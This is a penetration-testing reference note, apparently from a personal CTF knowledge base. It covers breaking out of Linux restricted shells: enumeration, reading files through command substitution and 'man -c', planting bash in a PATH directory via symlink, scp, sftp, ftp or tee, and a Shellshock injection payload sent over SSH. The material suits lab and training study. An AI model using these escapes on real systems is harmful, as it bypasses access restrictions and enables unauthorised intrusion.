---
Primary_category: "[[LINUX PRIVESC]]"
title: LINUX - ESCAPE RSHELLS
draft: false
banner: https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Restrictions*

*Restricted shells* tipically limit the default available capabilities of an standard shell itself, here are some of them

- ***Using the `cd` command***
- ***Setting or unsetting enviroment parameters***
- ***Cannot run any command that contains a `/` char***
- ***Output redirection using `>`, `>>`, `&>`, `>&` and `>>`***
- ***Use `exec` built-in to replace the current shell with another command***
- ***Use `enable` built-in to enable or disable other shell built-ins***
- ***Turning off restricted mode with `set +r` or `set +o restricted`***

---

#### *Enumeration*

##### *General*

Once we establish a connection to the target through *SSH* and we see that we are dealing with some kind of restrictive shell, we can run the following commands to get an idea of what we are up against

```bash
echo $0
echo $PATH
```

This way, we can list the available commands by retrieving the value of environment parameters such as *PATH*

##### *Enviroment Parameters*

We can run the following command to retrieve exported variables in the current restricted shell

```bash
env
printenv
export -p
declare
```

It would be interesting to be able to modify the value of *PATH* or *SHELL*, but they are always `-rx` *( i.e. executable but not writable )*

If not, simply set *SHELL* to any non-restricted shell, such as */bin/bash*, or *PATH* to a directory with ***[[#Sensitive Binaries|exploitable commands]]***

---

#### *Listing Directory Content*

If **`ls`** command is not available, we can list the content of the current directory as follows

```bash
echo *
```

Bear in mind that we cannot use **`/`** on commands, so we cannot list the content of other directories

However, there is a way to list the content of the current directory and child directories by enabling the *globstar bash* option using **`shopt`**

```bash
( shopt -s globstar ; echo ** )
```

> ***We use a subshell ( `( <COMMAND>)` ) to avoid polluting the current enviroment***

The initial focus should be on finding binaries that we can run to see if there are known shell escapes associated with them

---

#### *Listing File Content*

Commands such as `cat`, `less`, `more`, `vi`, `nano`, `head`, `tail` are typically forbidden, which makes it difficult *( nearly impossible* 😅 *)* to list the content of a given file

##### *Command Substitution + Input Redirection*

However, if *command substitution* is totally or partially enabled for certain commands, we can proceed as follows

> ***[Reference](https://stackoverflow.com/questions/22377792/how-to-use-echo-command-to-print-out-content-of-a-text-file)***

```bash
echo "$(< <FILE> )" # e.g. echo "$(< flag.txt )"
echo `< <FILE>` # e.g. echo `< flag.txt`
```

##### *Man*

```bash
man -c <FILE> # e.g. man -c flag.txt
```

> [!NOTE]- *Output Command*
>
> ```bash
> man: can't parse directory list `HTB{35c4p3_7h3_r3stricted_5h311}
'
> man: can't make sense of the manpath configuration file /etc/manpath.config
> ```
>

---

#### *Copying | Uploading Files*

> ***If we are able to copy a file into any PATH directory, we will bypass the `/` restriction***

if we are unable to modify the *PATH* parameter and we cannot add **`/`** to the current command either, we should first check the value of the *PATH* parameter

```bash
echo "$PATH"
declare -p -- PATH
export -p
env
printenv
```

Let's suppose that the *PATH* parameter has the following value

```bash
/home/john/rdir
```

Then, we would need to find a way to upload or create a file in that directory, so we could run the given binary without specifying its absolute path as it is located within a *PATH* directory

> ***This only applies if we have write permissions over the directory in question***

Bear in mind that we cannot use any type of redirection within *restricted shells*, so we could check if any of the following methods are possible

##### *Symlink*

If **`ln`** command is available →

```bash
ln -s /usr/bin/bash bash # CWD → /home/john/rdir
```

##### *SSH*

###### *SSH Client*

```bash
ssh -p22 <USER>@<TARGET> 'cp /usr/bin/bash /home/john/rdir/'
```

###### *SFTP Client*

```bash
scp /usr/bin/bash <USER>@<TARGET>:/home/john/rdir/
```

###### *SCP Client*

```bash
sftp -P22 <USER>@<TARGET>
> put /usr/bin/bash /home/john/rdir/
```

##### *FTP*

```bash
ftp <TARGET>
> put /usr/bin/bash /home/john/rdir/
```

##### *Tee*

```bash
echo '<CONTENT>' | tee -a <FILE>
```

---

#### *Sensitive Binaries*

If any of the following ***[binaries](https://gtfobins.org/#/^shell$/)*** is available in the restricted enviroment, it's over 💪🏻

---

#### *From the Outside*

##### *Command Execution*

```bash
ssh -p<PORT> <USER>@<TARGET> '<COMMAND>' # e.g. ssh john@web01 '/bin/bash'
```

##### *No Profile*

```bash
ssh -p<PORT> <USER>@<TARGET> 'bsh --noprofile'
```

##### *Shellshock*

> ***See [[CGI#Shellshock ( CVE-2014-{6271,7169} )|here]]***

If the existing ***[[BASH|bash]]*** version is vulnerable, proceed as follows

```bash
ssh -p<PORT> <USER>@<TARGET> '() { : ; } ; <COMMAND>' # e.g. ssh john@web01 '(){:;};whoami'
```

#### *Resources*

***[0xffsec: Escape from Restricted Shells](https://0xffsec.com/handbook/shells/restricted-shells/)***